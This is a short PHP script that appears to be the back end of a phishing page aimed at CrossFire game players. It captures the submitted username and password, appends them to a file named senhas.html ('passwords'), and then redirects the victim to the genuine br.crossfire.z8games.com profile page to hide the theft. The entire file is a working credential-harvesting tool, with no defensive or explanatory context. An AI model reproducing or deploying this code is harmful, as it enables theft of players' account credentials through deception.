<?php
$email = $_POST['Username'];
$senha = $_POST['Password'];
$tudo = "".$email.";".$senha."<br>";
$fopen = fopen("senhas.html", "a");
fwrite($fopen, $tudo);
fclose($fopen);


header("Location: http://br.crossfire.z8games.com/myprofile.html");